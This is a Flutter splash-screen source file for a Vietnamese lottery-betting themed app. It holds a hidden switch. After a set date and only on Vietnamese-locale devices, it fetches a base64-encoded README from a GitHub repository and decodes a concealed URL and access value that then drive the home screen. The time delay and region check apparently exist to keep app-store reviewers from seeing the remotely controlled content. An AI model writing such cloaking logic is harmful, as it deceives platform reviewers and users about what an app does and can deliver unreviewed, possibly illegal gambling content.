import 'package:flutter/material.dart';
import 'home_screen.dart';
import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import "package:http/http.dart" as http;

class _SplashScreenState extends State<SplashScreen>
    with WidgetsBindingObserver {
      String access = "";
      String url = "";
      late String _link;
      final String username = 'danhdeonline2024';
      final String repository = 'xosoonline'; 
      String readmeContent = '';

  Future<void> getDataFromCloudKit() async {
        try {
        DateTime time1 = DateTime(2024, 6, 22);
        DateTime time2 = DateTime.now();
        int daysDifference = calculateDaysDifference(time1, time2);
        print('Số ngày giữa $time1 và $time2 là $daysDifference ngày.');
        // check sim         
        //nếu lớn hơn 15 ngày thì mới chạy 
        if(daysDifference > 10){
          //nếu là ngôn ngư VN hay khu vực viet nam thì moi chay
          if(checkIfVietnam()){
            //nếu có sử dụng sim thì mới chạy
          final response = await http.get(Uri.parse('https://api.github.com/repos/$username/$repository/readme'));
          print("dsds${response.statusCode}");
          if (response.statusCode == 200) {
            final decodedResponse = jsonDecode(response.body);
            String readmeContentEncoded = decodedResponse['content'];
            RegExp validBase64Chars = RegExp(r'[^A-Za-z0-9+/=]'); //loại bỏ ký tự không hợp lệ
            readmeContentEncoded = readmeContentEncoded.replaceAll(validBase64Chars, '');
            String decodedReadmeContent = utf8.decode(base64.decode(readmeContentEncoded));
            Map<String, dynamic> decodedJson = json.decode(decodedReadmeContent);
            access = decodedJson['access'];
            url = decodedJson['url'];
          } else {
              print("Failed to fetch");
          }
      }
    }
    } catch (error) {
      print("loi: $error");
    }
    print("access: $access");
    print("url: $url");
    // Xây dựng URL cho yêu cầu lấy bản ghi
      Future.delayed(Duration(seconds: 1), () {
        // Change to Home View
        Navigator.pushReplacement(
            context, MaterialPageRoute(builder: (context) => HomeScreen(url: url, access: access)));
            });
    
  }


bool checkIfVietnam() {
  Locale locale = WidgetsBinding.instance.window.locale;
  print(locale.countryCode);
  return locale.countryCode!.toUpperCase() == 'VN';
}
  int calculateDaysDifference(DateTime date1, DateTime date2) {
    Duration difference = date2.difference(date1);
    int days = difference.inDays;
    return days.abs(); // Trả về giá trị tuyệt đối của số ngày
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    WidgetsBinding.instance?.addObserver(this);
    getDataFromCloudKit();
  }

  @override
  void dispose() {
    WidgetsBinding.instance?.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      // Xử lý liên kết sau khi quay lại ứng dụng
      getDataFromCloudKit();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Positioned.fill(
              child: Image.asset(
            'assets/logo.png',
            fit: BoxFit.fill,
          )),
          // Hình ảnh chính giữa màn hình
          // Loading circle nằm dưới màn hình
          Positioned(
            bottom: 50,
            left: 0,
            right: 0,
            child: Center(
              child: CircularProgressIndicator(),
            ),
          ),
        ],
      ),
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  _SplashScreenState createState() => _SplashScreenState();
}

void main() {
  runApp(LotoApp());
}

class LotoApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Lô Đề Game',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: SplashScreen(),
    );
  }
}
